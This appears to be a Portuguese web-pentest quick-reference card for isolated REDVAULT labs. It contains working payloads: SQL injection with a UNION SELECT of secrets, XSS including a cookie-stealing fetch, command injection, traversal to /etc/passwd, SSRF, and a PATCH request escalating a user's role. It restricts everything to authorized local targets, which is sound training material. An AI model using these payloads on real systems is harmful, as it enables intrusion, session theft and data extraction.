---
slug: quick-reference
title: "Referência rápida do operador"
category: reference
difficulty: beginner
summary: "Um cartão de campo compacto para escopo, captura de request, descoberta, testes de autorização e coleta de evidências. Payloads são apenas para alvos locais autorizados."
tags: [reference, cheat-sheet, curl, methodology]
updated: 2026-11-12
version: "1.0"
source_type: standard
order: 900
---

# Referência rápida do operador

Use isto como um cartão, não como substituto do entendimento. Todo payload abaixo é para um alvo seu ou para os labs isolados do REDVAULT. Substitua `PORT` pela porta loopback exibida no painel do lab.

## Comece limpo

```bash
export TARGET=http://127.0.0.1:PORT
export COOKIE=/tmp/rv-lab.cookies
curl -i "$TARGET/" -c "$COOKIE"
curl -i "$TARGET/challenges" -b "$COOKIE" -c "$COOKIE"
```

Registre status, headers e corpo em separado. Um `200` com uma página de erro não é sucesso.

## Envie exatamente o que o app espera

```bash
# Form
curl -i -b "$COOKIE" -c "$COOKIE" -X POST "$TARGET/login" \
  --data-urlencode 'username=alice' --data-urlencode 'password=alice123'

# JSON
curl -i -b "$COOKIE" -X POST "$TARGET/api/v1/items" \
  -H 'Content-Type: application/json' -d '{"name":"test"}'

# Header customizado
curl -i -H 'X-Forwarded-Host: canary.invalid' "$TARGET/forgot"
```

## Descoberta segura

```bash
curl -s "$TARGET/robots.txt"
curl -s "$TARGET/sitemap.xml"
curl -s "$TARGET/static/app.js" | grep -Ei 'api|token|key|internal'
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$TARGET/backups/"
```

Verifique artefatos de arquivo e editor apenas no lab atribuído:

```text
.git/HEAD
.env
config.php.bak
backup.zip
.DS_Store
```

## Checagens de autenticação

```bash
# Compare usuário existente vs. inexistente
curl -s -o /dev/null -w 'existente: %{http_code} %{time_total}\n' \
  -X POST "$TARGET/login" -d 'username=admin&password=x'
curl -s -o /dev/null -w 'ausente:   %{http_code} %{time_total}\n' \
  -X POST "$TARGET/login" -d 'username=nobody&password=x'

# Inspecione cookies
curl -i -b "$COOKIE" -c "$COOKIE" "$TARGET/login"
```

Teste rotação de sessão após login, invalidação no logout, escopo do token de reset e influência de host header.

## Autorização de objeto com duas contas

```bash
# Conta A cria o objeto 101
# Conta B o requisita com o cookie de B
curl -i -b /tmp/b.cookies "$TARGET/api/invoices/101"
curl -i -b /tmp/b.cookies -X PATCH "$TARGET/api/users/7" \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'
```

Esperado: `403` ou `404`. Qualquer dado ou mudança de estado pertencente a A é um achado. Teste também endpoints de listagem, busca, exportação e batch.

## Sondas de SQL injection

```text
'
''
' AND 1=1 -- 
' AND 1=2 -- 
' ORDER BY 1 -- 
' ORDER BY 5 -- 
```

Para um lab:

```bash
curl -s -G "$TARGET/" --data-urlencode "q=%' UNION SELECT 1,secret,3 FROM vault -- " -b "$COOKIE"
```

Pare na prova. Não extraia dados além do objetivo.

## Sondas de XSS

```html
<!-- Texto HTML -->
<img src=x onerror=alert(1)>

<!-- Atributo -->
" autofocus onfocus=alert(1) x="

<!-- String JS -->
'; alert(1); //

<!-- URL -->
javascript:alert(1)
```

Prove execução com navegador e um callback, não com uma string refletida:

```html
<script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>
```

## Sondas de SSRF

```bash
# Callback que o servidor consegue alcançar
curl -s -b "$COOKIE" -X POST "$TARGET/fetch" -d 'url=http://127.0.0.1:PORT/internal/flag'
```

Tente representações alternativas de loopback apenas dentro do lab. Um redirect a partir de um host permitido é outro bypass comum.

## Path traversal e command injection

```text
?file=../etc/passwd
?file=....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

```text
127.0.0.1; id
127.0.0.1 && uname -a
127.0.0.1 | whoami
127.0.0.1; sleep 3
```

Para casos cegos, use um listener de callback local e um token único. Nunca envie uma reverse shell para um host público.

## Decodificação de JWT

```bash
python3 - <<'PY'
import base64, json, sys
token = sys.argv[1] if len(sys.argv) > 1 else input("token: ")
for label, part in zip(("header", "payload"), token.split(".")[:2]):
    data = json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))
    print(label, json.dumps(data, indent=2))
PY
```

Decodificar não é verificar. Procure segredos HMAC fracos apenas no lab e nunca confie em uma claim `role` sem assinatura válida e autorização atual.

## Checagens de cache

```bash
# Marcador de query único, depois recupere com um cliente novo
curl -s "$TARGET/?cb=$RANDOM" | grep -i 'canary'
curl -s "$TARGET/account/profile.css" -b "$COOKIE" | grep -i 'private'
```

Verifique `Cache-Control`, `Vary`, `Set-Cookie` e `Age`. Use um cliente novo, não autenticado, para testar deception.

## Template de evidência

```text
Título:
Alvo / porta:
Conta / papel:
Pré-condições:
1. Request:
   Response:
2. Request:
   Response:
Impacto:
Causa raiz:
Correção:
Reteste:
```

Redija cookies, tokens e dados pessoais. Guarde requests brutas em texto, não apenas em capturas de tela.

## Condições de parada

Pare e reavalie se:

- Você está prestes a tocar em dados fora do objetivo.
- O próximo passo afetaria disponibilidade.
- Você precisa de outro tenant/sistema fora do escopo.
- A evidência é apenas uma string refletida ou uma versão adivinhada.
- Você não consegue explicar a causa raiz.

## Referências

- [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.wiki/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)